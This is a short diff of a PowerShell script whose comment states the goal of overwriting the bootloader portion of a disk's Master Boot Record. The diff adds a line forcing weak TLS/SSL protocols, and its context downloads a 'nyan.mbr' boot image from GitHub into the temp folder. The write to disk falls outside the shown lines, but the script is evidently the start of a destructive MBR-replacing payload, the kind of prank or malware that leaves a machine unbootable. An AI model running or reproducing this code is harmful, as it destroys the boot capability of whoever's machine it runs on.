@@ -1,5 +1,7 @@
 # Context: MBR is 512 bytes long. First 446 is the bootloader, next 64 is the partiton table, and the final 2 are a boot signature. We want to overwrite the bootloader but leave the other 2 alone
 
+[Net.ServicePointManager]::SecurityProtocol = "Tls12, Tls11, Tls, Ssl3"
+
 # Download nyan.mbr
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing
 
